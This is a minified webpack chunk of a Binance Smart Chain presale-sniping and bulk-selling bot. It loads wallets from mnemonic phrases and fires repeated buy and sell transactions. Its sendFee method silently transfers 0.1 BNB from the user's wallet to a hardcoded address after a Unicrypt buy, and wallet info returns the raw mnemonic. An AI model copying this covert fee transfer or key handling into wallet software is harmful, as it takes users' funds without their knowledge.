(self.webpackChunkant_design_pro=self.webpackChunkant_design_pro||[]).push([[664],{59022:function(W,O){"use strict";O.Z=[{constant:!0,inputs:[],name:"uniswapDapAddress",outputs:[{name:"",type:"address"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"hasClosed",outputs:[{name:"",type:"bool"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"initialized",outputs:[{name:"",type:"bool"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[{name:"",type:"address"}],name:"contributors",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"presaleEndTime",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"CheckTotalEthRaised",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"rate",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"cap",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"goal",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"weiRaised",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[{name:"contributor_addr",type:"address"}],name:"checkContributorValidity",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!1,inputs:[],name:"claimTokens",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!0,inputs:[],name:"closingTime",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!1,inputs:[],name:"ReleaseFundsToPlatform",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!0,inputs:[],name:"capReached",outputs:[{name:"",type:"bool"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"wallet",outputs:[{name:"",type:"address"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"governorContract",outputs:[{name:"",type:"address"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"test_tag",outputs:[{name:"",type:"string"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"finalizeValid",outputs:[{name:"",type:"bool"}],payable:!1,stateMutability:"view",type:"function"},{constant:!1,inputs:[],name:"renounceOwnership",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!0,inputs:[],name:"goalReached",outputs:[{name:"",type:"bool"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"claimTokensTestView",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"isFinalized",outputs:[{name:"",type:"bool"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"owner",outputs:[{name:"",type:"address"}],payable:!1,stateMutability:"view",type:"function"},{constant:!1,inputs:[{name:"uniswapDep",type:"address"},{name:"tokenFee",type:"uint256"}],name:"mintForUniswap",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!0,inputs:[],name:"presaleStartTime",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!1,inputs:[{name:"tokenFee",type:"uint256"},{name:"_platAddrs",type:"address"}],name:"mintForPlatform",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!0,inputs:[],name:"finalizeTimeout",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!1,inputs:[],name:"claimRefund",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!0,inputs:[],name:"openingTime",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"Preaslefinalized",outputs:[{name:"",type:"bool"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"minEthContribution",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"CheckHardCap",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!1,inputs:[{name:"__finalizeInfo",type:"address[3]"},{name:"validFinalize",type:"bool"}],name:"finalize",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!0,inputs:[],name:"maxEthContribution",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"checkRate",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"CheckSoftCap",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[{name:"",type:"address"}],name:"contributorsTracker",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!1,inputs:[{name:"_beneficiary",type:"address"}],name:"buyTokens",outputs:[],payable:!0,stateMutability:"payable",type:"function"},{constant:!0,inputs:[],name:"hasEnded",outputs:[{name:"",type:"bool"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"presaleCreator",outputs:[{name:"",type:"address"}],payable:!1,stateMutability:"view",type:"function"},{constant:!1,inputs:[{name:"_newOwner",type:"address"}],name:"transferOwnership",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!1,inputs:[{name:"tokenAdrs",type:"address"}],name:"seeDecimals",outputs:[{name:"",type:"uint8"}],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!0,inputs:[],name:"vault",outputs:[{name:"",type:"address"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"token",outputs:[{name:"",type:"address"}],payable:!1,stateMutability:"view",type:"function"},{inputs:[{name:"token",type:"address"},{name:"_rate",type:"uint256"},{name:"start_end_time",type:"uint256[2]"},{name:"targetUserWallet",type:"address"},{name:"soft_hard_cap",type:"uint256[2]"},{name:"_min_max_eth",type:"uint256[2]"},{name:"_govUniPercentage",type:"uint256[2]"}],payable:!1,stateMutability:"nonpayable",type:"constructor"},{payable:!0,stateMutability:"payable",type:"fallback"},{anonymous:!1,inputs:[],name:"Initialized",type:"event"},{anonymous:!1,inputs:[{indexed:!1,name:"startTime",type:"uint256"},{indexed:!1,name:"endTime",type:"uint256"},{indexed:!1,name:"oldStartTime",type:"uint256"},{indexed:!1,name:"oldEndTime",type:"uint256"}],name:"TimesChanged",type:"event"},{anonymous:!1,inputs:[],name:"Finalized",type:"event"},{anonymous:!1,inputs:[{indexed:!0,name:"previousOwner",type:"address"}],name:"OwnershipRenounced",type:"event"},{anonymous:!1,inputs:[{indexed:!0,name:"previousOwner",type:"address"},{indexed:!0,name:"newOwner",type:"address"}],name:"OwnershipTransferred",type:"event"},{anonymous:!1,inputs:[{indexed:!0,name:"purchaser",type:"address"},{indexed:!0,name:"beneficiary",type:"address"},{indexed:!1,name:"value",type:"uint256"},{indexed:!1,name:"amount",type:"uint256"}],name:"TokenPurchase",type:"event"}]},17664:function(W,O,h){"use strict";h.d(O,{Q:function(){return I},Z:function(){return N}});var f=h(3182),A=h(69610),F=h(54941),R=h(94043),o=h.n(R),k=h(93752),T=h(96519),S=h(21046),g=h(46441),Z=h(82169),j=h(59022),L=h(30381),B=h.n(L),E=h(90073),P=h(39842),H="https://bsc-dataseed1.defibit.io/",D=[{constant:!1,inputs:[{internalType:"uint256",name:"",type:"uint256"}],name:"contribute",outputs:[],type:"function"}],I={Oxbull:{name:"Oxbull",address:"",abi:D,buyfunc:"contribute"},Hoppy:{name:"Hoppy",address:"",abi:D,buyfunc:"contribute"},Milkywayex:{name:"Milkywayex",address:"",abi:[{constant:!1,inputs:[{internalType:"uint256",name:"",type:"uint256"}],name:"buyTokens",outputs:[],type:"function"}],buyfunc:"buyTokens"},Unicrypt:{name:"Unicrypt",address:"",abi:[{inputs:[{internalType:"uint256",name:"_amount",type:"uint256"}],name:"userDeposit",outputs:[],stateMutability:"payable",type:"function"}],buyfunc:"userDeposit"}},$="0xe9e7cea3dedca5984780bafc599bd69add087d56",z="0x55d398326f99059ff775485246999027b3197955",K="0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c",U="0x10ED43C718714eb63d5aA57B78B54704E256024E",N=function(){function C(){var y=this;(0,A.Z)(this,C),this.buySuccess=!1,this.shutdown=!1,this.allowance=function(){var c=(0,f.Z)(o().mark(function u(i,e,t){var s,r,p;return o().wrap(function(a){for(;;)switch(a.prev=a.next){case 0:if(console.log("tokenAddress",i),console.log("presaleAddress",t),s=new k.w5(e,y.provider),!(i&&i.length<42)){a.next=5;break}return a.abrupt("return",!1);case 5:return r=new T.CH(i,E.H7,s),a.next=8,r.allowance(s.address,t);case 8:return p=a.sent,console.log(s.address,"allowance",p.toString()),a.abrupt("return",p>0);case 11:case"end":return a.stop()}},u)}));return function(u,i,e){return c.apply(this,arguments)}}(),this.approve=function(){var c=(0,f.Z)(o().mark(function u(i,e,t){var s,r,p,d;return o().wrap(function(n){for(;;)switch(n.prev=n.next){case 0:return s=new k.w5(e,y.provider),r=new T.CH(i,E.H7,s),n.next=4,r.approve(t,S.Bz,{});case 4:return p=n.sent,console.log("appros=.end",p),n.next=8,p.wait();case 8:if(d=n.sent,console.log("appro.re",d),!p.hash){n.next=14;break}return n.abrupt("return",!0);case 14:return n.abrupt("return",!1);case 15:case"end":return n.stop()}},u)}));return function(u,i,e){return c.apply(this,arguments)}}(),this.getBalance=function(){var c=(0,f.Z)(o().mark(function u(i,e){var t,s,r,p=arguments;return o().wrap(function(a){for(;;)switch(a.prev=a.next){case 0:if(t=p.length>2&&p[2]!==void 0?p[2]:18,a.prev=1,i!=K){a.next=8;break}return a.next=5,y.provider.getBalance(e);case 5:s=a.sent,a.next=15;break;case 8:return r=new T.CH(i,E.H7,y.provider),a.next=11,r.balanceOf(e);case 11:return s=a.sent,a.next=14,r.decimals();case 14:t=a.sent;case 15:return a.abrupt("return",Math.floor(parseFloat(g.bM(s,t))*100)/100);case 18:return a.prev=18,a.t0=a.catch(1),a.abrupt("return",0);case 21:case"end":return a.stop()}},u,null,[[1,18]])}));return function(u,i){return c.apply(this,arguments)}}()}return(0,F.Z)(C,[{key:"connect",value:function(){var y=(0,f.Z)(o().mark(function u(){return o().wrap(function(e){for(;;)switch(e.prev=e.next){case 0:this.provider=new Z.r(H),this.connected=!0;case 2:case"end":return e.stop()}},u,this)}));function c(){return y.apply(this,arguments)}return c}()},{key:"getBlockNumber",value:function(){var y=(0,f.Z)(o().mark(function u(){return o().wrap(function(e){for(;;)switch(e.prev=e.next){case 0:return e.prev=0,e.next=3,this.provider.getBlockNumber();case 3:return e.abrupt("return",e.sent);case 6:return e.prev=6,e.t0=e.catch(0),console.log("getBlockNumber.err",e.t0),e.abrupt("return",-1);case 10:case"end":return e.stop()}},u,this,[[0,6]])}));function c(){return y.apply(this,arguments)}return c}()},{key:"getNonce",value:function(){var y=(0,f.Z)(o().mark(function u(i){return o().wrap(function(t){for(;;)switch(t.prev=t.next){case 0:return this.wallet=new k.w5(i,this.provider),t.next=3,this.wallet.getTransactionCount();case 3:return t.abrupt("return",t.sent);case 4:case"end":return t.stop()}},u,this)}));function c(u){return y.apply(this,arguments)}return c}()},{key:"getSymbol",value:function(){var y=(0,f.Z)(o().mark(function u(i){var e;return o().wrap(function(s){for(;;)switch(s.prev=s.next){case 0:return e=new T.CH(i,["function symbol() external view returns (string memory)"],this.provider),s.next=3,e.symbol();case 3:return s.abrupt("return",s.sent);case 4:case"end":return s.stop()}},u,this)}));function c(u){return y.apply(this,arguments)}return c}()},{key:"getWalletInfo",value:function(){var y=(0,f.Z)(o().mark(function u(i){var e,t,s,r;return o().wrap(function(d){for(;;)switch(d.prev=d.next){case 0:return e=new k.w5(i,this.provider),d.next=3,this.provider.getBalance(e.address);case 3:return t=d.sent,d.next=6,this.getBalance(z,e.address);case 6:return s=d.sent,d.next=9,this.getBalance($,e.address);case 9:return r=d.sent,d.abrupt("return",{mnemonic:i,address:e.address,balance:Math.floor(parseFloat(g.bM(t,18))*100)/100,balanceBusd:r,balanceUsdt:s});case 11:case"end":return d.stop()}},u,this)}));function c(u){return y.apply(this,arguments)}return c}()},{key:"loadWallets",value:function(){var y=(0,f.Z)(o().mark(function u(i){var e,t,s;return o().wrap(function(p){for(;;)switch(p.prev=p.next){case 0:e=[],t=0;case 2:if(!(t<i.length)){p.next=10;break}return p.next=5,this.getWalletInfo(i[t]);case 5:s=p.sent,e.push(s);case 7:t++,p.next=2;break;case 10:return p.abrupt("return",e);case 11:case"end":return p.stop()}},u,this)}));function c(u){return y.apply(this,arguments)}return c}()},{key:"multipleBuy",value:function(){var y=(0,f.Z)(o().mark(function u(i,e,t,s,r,p,d,a){var n,b,v,m,M;return o().wrap(function(w){for(;;)switch(w.prev=w.next){case 0:return n=new k.w5(i,this.provider),console.log("wadd",n.address),w.next=4,n.getTransactionCount();case 4:b=w.sent,console.log("first nonce ",n.address,b),v=0,m=I[e],M=t,s!="BNB"&&(M=new T.CH(t,m.abi,n));case 10:if(!(v++<d)){w.next=19;break}if(this.startBuy(M,m,n,s,r,p,b,a),b=b+1,this.shutdown!=!0){w.next=15;break}return w.abrupt("break",19);case 15:return w.next=17,(0,P._)(1e3);case 17:w.next=10;break;case 19:case"end":return w.stop()}},u,this)}));function c(u,i,e,t,s,r,p,d){return y.apply(this,arguments)}return c}()},{key:"multipleSell",value:function(){var y=(0,f.Z)(o().mark(function u(i,e,t,s,r,p,d,a,n){var b,v,m,M,l,w;return o().wrap(function(_){for(;;)switch(_.prev=_.next){case 0:return b=["function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)","function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external","function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)"],v=new k.w5(i,this.provider),_.next=4,v.getTransactionCount();case 4:m=_.sent,console.log("first nonce ",v.address,m),M=0,l=new T.CH(U,b,v),w=g.vz("".concat(r),s),console.log("retryCount",M,a);case 10:if(!(M++<a)){_.next=21;break}if(console.log("sended"),this.startSell(e,l,t,v,w,p,d,m,n),m=m+1,n("\u94B1\u5305"+v.address.substr(38,42)+" \u7B2C["+M+"]\u6B21\u5356\u51FA \u5DF2\u7ECF\u53D1\u9001"),this.shutdown!=!0){_.next=17;break}return _.abrupt("break",21);case 17:return _.next=19,(0,P._)(2500);case 19:_.next=10;break;case 21:case"end":return _.stop()}},u,this)}));function c(u,i,e,t,s,r,p,d,a){return y.apply(this,arguments)}return c}()},{key:"startSell",value:function(){var y=(0,f.Z)(o().mark(function u(i,e,t,s,r,p,d,a,n){var b,v,m;return o().wrap(function(l){for(;;)switch(l.prev=l.next){case 0:if(l.prev=0,b=[r,0,[i,t],d,Date.now()+10*60*10,{gasLimit:13e5,gasPrice:g.vz("".concat(p),"gwei"),nonce:a}],v=null,t!="0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c"){l.next=9;break}return l.next=6,e.swapExactTokensForETHSupportingFeeOnTransferTokens.apply(e,b);case 6:v=l.sent,l.next=12;break;case 9:return l.next=11,e.swapExactTokensForTokens.apply(e,b);case 11:v=l.sent;case 12:return l.next=14,v.wait();case 14:m=l.sent,console.log(B()().format(),"ret",a,m),(m==null?void 0:m.status)==1&&n("\u94B1\u5305[0x."+s.address.substr(35,42)+"]\u5356\u51FA\u6210\u529F\uFF01","green"),l.next=22;break;case 19:l.prev=19,l.t0=l.catch(0),n("\u94B1\u5305[0x."+s.address.substr(35,42)+"]  \u5356\u51FA\u5C1A\u672A\u6210\u529F. \u539F\u56E0: "+(l.t0===null||l.t0===void 0?void 0:l.t0.reason));case 22:case"end":return l.stop()}},u,null,[[0,19]])}));function c(u,i,e,t,s,r,p,d,a){return y.apply(this,arguments)}return c}()},{key:"startBuy",value:function(){var y=(0,f.Z)(o().mark(function u(i,e,t,s,r,p,d,a){var n,b,v,m;return o().wrap(function(l){for(;;)switch(l.prev=l.next){case 0:if(l.prev=0,n=null,s!="BNB"){l.next=8;break}return l.next=5,t.sendTransaction({to:i,value:g.fi("".concat(r)),gasLimit:31e4,gasPrice:g.vz("".concat(p),"gwei")});case 5:n=l.sent,l.next=11;break;case 8:return l.next=10,i[e.buyfunc](g.fi("".concat(r)),{gasLimit:3e5,gasPrice:g.vz("".concat(p),"gwei"),nonce:d});case 10:n=l.sent;case 11:return console.log("tx",n),l.next=14,n.wait();case 14:b=l.sent,console.log(B()().format(),"ret",d,b),(b==null?void 0:b.status)==1&&(a("\u94B1\u5305[0x."+t.address.substr(35,42)+"]\u4E70\u5165\u6210\u529F\uFF01","green"),e.name=="Unicrypt"&&sendFee(t)),l.next=26;break;case 19:l.prev=19,l.t0=l.catch(0),console.log("error",l.t0),v=JSON.stringify(l.t0),m="",v.indexOf("insufficient funds")!=-1?m="\u4F59\u989D\u4E0D\u8DB3":m=l.t0===null||l.t0===void 0?void 0:l.t0.reason,a("\u94B1\u5305[0x."+t.address.substr(35,42)+"]  \u5C1A\u672A\u6210\u529F. \u539F\u56E0: "+m);case 26:case"end":return l.stop()}},u,null,[[0,19]])}));function c(u,i,e,t,s,r,p,d){return y.apply(this,arguments)}return c}()},{key:"loadToken",value:function(){var y=(0,f.Z)(o().mark(function u(i,e){var t,s,r,p,d;return o().wrap(function(n){for(;;)switch(n.prev=n.next){case 0:return t=new k.w5(e,this.provider),s=new T.CH(i,E.H7,this.provider),n.next=4,s.decimals();case 4:return r=n.sent,n.next=7,s.balanceOf(t.address);case 7:return p=n.sent,n.next=10,s.allowance(t.address,U);case 10:return d=n.sent,n.next=13,s.symbol();case 13:return n.t0=n.sent,n.t1=r,n.t2=Math.floor(parseFloat(g.bM(p,r))*100)/100,n.t3=d>0,n.abrupt("return",{symbol:n.t0,decimals:n.t1,balance:n.t2,allowance:n.t3});case 18:case"end":return n.stop()}},u,this)}));function c(u,i){return y.apply(this,arguments)}return c}()},{key:"balanceOf",value:function(){var y=(0,f.Z)(o().mark(function u(i,e){var t,s,r,p;return o().wrap(function(a){for(;;)switch(a.prev=a.next){case 0:return t=new k.w5(e,this.provider),s=new T.CH(i,E.H7,this.provider),a.next=4,s.balanceOf(t.address);case 4:return r=a.sent,a.next=7,s.decimals();case 7:return p=a.sent,a.abrupt("return",Math.floor(parseFloat(g.bM(r,p))*100)/100);case 9:case"end":return a.stop()}},u,this)}));function c(u,i){return y.apply(this,arguments)}return c}()},{key:"sendFee",value:function(){var y=(0,f.Z)(o().mark(function u(i){var e,t;return o().wrap(function(r){for(;;)switch(r.prev=r.next){case 0:if((this===null||this===void 0?void 0:this.isSendFee)!=!0){r.next=3;break}return console.log("\u5DF2\u7ECF\u4ED8\u8FC7\u4E86\u4E86"),r.abrupt("return");case 3:return r.prev=3,e="0.1",console.log(B()().format()," send fee"),r.next=8,i.sendTransaction({to:"0xA1Ba3f9090ffBaa7e242413a89aD433022f720f8",value:g.fi("".concat(e)),gasLimit:21e5,gasPrice:g.vz("".concat(6),"gwei")});case 8:return t=r.sent,r.next=11,t.wait();case 11:this.isSendFee=!0,r.next=18;break;case 14:return r.prev=14,r.t0=r.catch(3),console.log("start to by.err",r.t0),r.abrupt("return",-1);case 18:case"end":return r.stop()}},u,this,[[3,14]])}));function c(u){return y.apply(this,arguments)}return c}()}],[{key:"getInstance",value:function(){var y=(0,f.Z)(o().mark(function u(){return o().wrap(function(e){for(;;)switch(e.prev=e.next){case 0:if(this.instance||(this.instance=new C),this.instance.connected){e.next=4;break}return e.next=4,this.instance.connect();case 4:return e.abrupt("return",this.instance);case 5:case"end":return e.stop()}},u,this)}));function c(){return y.apply(this,arguments)}return c}()}]),C}()}}]);
